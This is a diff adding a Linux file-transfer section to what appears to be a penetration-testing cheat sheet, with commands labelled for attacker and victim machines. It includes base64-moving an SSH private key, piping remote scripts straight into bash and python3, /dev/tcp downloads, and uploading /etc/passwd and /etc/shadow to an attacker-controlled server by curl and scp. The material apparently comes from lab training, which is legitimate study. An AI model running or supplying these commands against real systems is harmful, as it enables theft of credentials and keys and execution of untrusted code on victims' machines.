@@ -576,6 +576,61 @@ V> ftp> USER anonymous
 V> ftp> PUT c:\windows\system32\drivers\etc\hosts
 V> ftp> bye
 ```
+### Linux File Transfer
+#### Download Operations
+##### Base64 Encoding / Decoding
+```
+A> md5sum id_rsa
+A> cat id_rsa |base64 -w 0;echo
+V>  echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3Rjbg
+pOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCtLS0tLQo=' | base64 -d > id_rsa
+V> md5sum id_rsa
+```
+#### Web Downloads with Wget and cURL
+```
+V> wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+V> curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+V> curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+V> wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+```
+#### Download with Bash (/dev/tcp)
+```
+V> exec 3<>/dev/tcp/10.10.10.32/80
+V> echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+V> cat <&3
+```
+#### SSH Downloads
+```
+A> sudo systemctl enable ssh
+A> sudo systemctl start ssh
+A> netstat -lnpt
+V> scp plaintext@192.168.49.128:/root/myroot.txt . 
+```
+#### Upload Operations
+##### Web Upload
+```
+A> sudo python3 -m pip install --user uploadserver
+A> openssl req -x509 -out /differnetdirectory/server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+A>  mkdir https && cd https
+A> sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+V> curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+##### Alternative Web File Transfer Method
+```
+V> python3 -m http.server
+OR
+V> python2.7 -m SimpleHTTPServer
+OR 
+V> php -S 0.0.0.0:8000
+OR
+V> ruby -run -ehttpd . -p8000
+A> wget 192.168.49.128:8000/filetotransfer.txt
+```
+##### SCP Upload
+```
+V> scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
+```
+
 ## Shells
 
 ##### Reverse Shell
